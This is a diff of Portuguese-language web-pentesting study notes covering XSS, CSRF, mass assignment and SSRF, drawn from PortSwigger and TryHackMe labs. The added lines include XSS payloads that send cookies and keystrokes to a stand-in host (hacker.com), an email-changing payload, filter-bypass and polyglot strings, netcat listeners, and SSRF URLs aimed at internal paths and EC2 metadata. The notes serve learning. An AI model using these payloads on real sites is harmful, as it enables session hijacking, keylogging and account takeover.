@@ -354,14 +354,27 @@ $ hydra -l bruno -P passwords.txt "localhost" http-form-post "/bruteforce1/index
 
 #Cross_Site_Scripting (XSS):
      * De acordo com a OWASP, os ataques XSS Persistent são aqueles onde os scripts são armazenados permanentemente no back-end. A vítima então recebe esse script ao realizar o acesso a página.
-       ! XSS reflected => Caso for feito um XSS refletido, o script inserido é executado apenas na página do atacante. Devido a isso, caso ele queira que outro usuário acesse a página, deverá enviar sua url para que o outro acesse e veja seu script. Isso é um ataque de engenharia social conhecido como phishing.
-         XSS Persist => Caso for feito um XSS armazenado ou persistente, o script inserido pelo atacante ficará armazenado no servidor da aplicação, sendo assim, qualquer outro usuário que acessar a página verá o script injetado.
-         XSS baseada em DOM => XSS baseada em DOM, ela se diferencia dos outros tipos de XSS porque o ataque, nesse caso, acontece apenas no navegador do cliente sem que nenhum parâmetro seja enviado ao servidor.
+     * ! XSS reflected => Caso for feito um XSS refletido, o script inserido é executado apenas na página do atacante. Devido a isso, caso ele queira que outro usuário acesse a página, deverá enviar sua url para que o outro acesse e veja seu script. Isso é um ataque de engenharia social conhecido como phishing.
+     * ! XSS Persist => Caso for feito um XSS armazenado ou persistente, o script inserido pelo atacante ficará armazenado no servidor da aplicação, sendo assim, qualquer outro usuário que acessar a página verá o script injetado.
+     * ! XSS baseada em DOM => O JavaScript do site obtém o conteúdo do parâmetro window.location.x e o grava na página, na seção visualizada no momento. O conteúdo do hash não é verificado em busca de código malicioso, permitindo que um invasor injete o JavaScript de sua escolha na página. Quando você encontrar esses trechos de código, precisará ver como eles são manipulados e se os valores são gravados no DOM da página da web ou passados ​​para métodos JavaScript inseguros, como eval().
 ```bash
    $ nc -lvp 80   =>  Net catch, responsável por abrir portas, ele ficará escutando as informações que trafegam nessa porta. Utilizando o Kali Linux, abrimos o terminal e nele vamos usar o net catch (nc). O nc deve escutar (-l) e mostrar (v) a porta (p) de número 80.
        $ No lab 1 de XSS da PortSwigger colocamos na barra de busca '<script>alert(1)</script>', essa informação alterou nossa url, assim, quando alguem acessar esse link novamente, a url virá com esse script que será interpretado pelo navegador.
        $ No lab 3 analisando o html vimos que a cada busca na barra de pesquisa o texto é adicionado me uma tag img ' <img src="/resources/images/tracker.gif?searchTerms=busca feita na barra de pesquisa ">'. Dessa forma, podemos colocar um código nessa tag para executarmos um ataque XSS, ' <img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)> //
 "> '
+
+& <script>alert('XSS');</script>
+& <script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>
+& <script>document.onkeypress = function(e) {fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>
+& <script>user.changeEmail('attacker@email.com');</script>
+& <sscriptcript>alert('THM');</sscriptcript>
+& /images/cat.jpg" onload="alert('THM');
+
+& nc -nlvp <port>
+& </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
+```
+```
+& jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
 ```
 #Mass_Assignment:
        * A atribuição em massa é uma vulnerabilidade do computador em que um padrão de registro ativo em um aplicativo Web é abusado para modificar itens de dados que o usuário normalmente não deve ter permissão para acessar, como senha, permissões concedidas ou status de administrador. (O ataque de Mass Assignment explora a questão dos frameworks MVC permitirem que associemos valores dos formulários diretamente com nossas classes de modelo. Com isso, o usuário pode vir através da manipulação do formulário HTML alterar os atributos presentes nessa classe modelo.)
@@ -410,8 +423,11 @@ $ FileFilter filtro = new FileNameExtensionFilter("jpg", "jpeg");
       ! No lab 1 de CSRF usamos o script: <html> <body> <form enctype="application/x-www-form-urlencoded" action="https://0a0600c3030c116bc0fe0af000d800af.web-security-academy.net/my-account" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit();</script></body> </html>
 
 #Server-side_request_forgery:
-      * In computer security, server-side request forgery (SSRF) is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker.
-      ! https://192.168.100.167/mutillidae/index.php?page=https://localhost/ => aqui pela URL conseguimos retornar o localhost do servidor a partir da minha máquina, confirando assim um SSRF
+      * SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.
+      ! https://website.com/stock?url=https://api.website.com/api/stock/item?id=123
+      ! https://api.website.com/api/stock/../user
+      ! https://website.com/item/2?server=server.website.com/flag?id=9&x= (&x= to ignore the rest of the URL)
+      ! https://domain/index.php?page=https://localhost/ => aqui pela URL conseguimos retornar o localhost do servidor a partir da minha máquina, confirando assim um SSRF
       ! http://localhost/admin/delete?username=carlos
       ! Tendo como exemplo o provedor de nuvem AWS, é bastante comum de se ver aplicações hospedadas em um Amazon Elastic Compute Cloud (Amazon EC2) e, com isso, atacantes acabam obtendo um meio de acessar credenciais de metadados de máquinas EC2 por meio do SSRF.
         No exemplo descrito na página Hacking The Cloud, é possível ver que a maioria das instâncias do EC2 possuem acesso ao serviço de metadados que contém informações, como endereço IP da instância, credenciais das IAM roles e o nome do security group e, esse acesso é feito por meio do endereço de IP 169.254.169.254.
